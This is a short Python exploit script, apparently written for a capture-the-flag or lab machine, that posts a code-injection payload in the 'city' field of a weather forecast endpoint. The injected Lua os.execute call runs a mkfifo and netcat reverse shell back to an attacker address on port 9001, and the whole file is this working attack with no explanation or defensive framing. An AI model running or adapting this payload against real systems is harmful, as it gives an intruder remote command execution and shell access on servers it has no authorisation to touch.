import requests

session = requests.Session()

rev_shell_payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.207 9001 >/tmp/f"

payload = f"'); os.execute(\"{rev_shell_payload}\")--"

#print(payload)

url = "http://10.10.10.218/weather/forecast"
data = {
    "city" : payload 
}

resp = session.post(url, data=data)
print(resp.text)

